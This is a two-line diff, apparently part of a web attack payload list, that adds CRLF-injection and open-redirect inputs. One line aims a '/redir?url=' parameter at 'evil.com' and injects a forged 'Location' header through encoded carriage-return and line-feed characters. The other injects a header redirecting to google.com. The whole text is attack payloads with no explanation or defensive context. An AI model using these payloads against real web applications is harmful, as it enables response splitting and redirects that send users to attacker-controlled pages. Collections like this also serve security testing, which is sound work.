@@ -1,0 +1,2 @@
+/redir?url=//evil.com%0D%0ALocation:%20evil.com
+&%0d%0a1Location:https://google.com
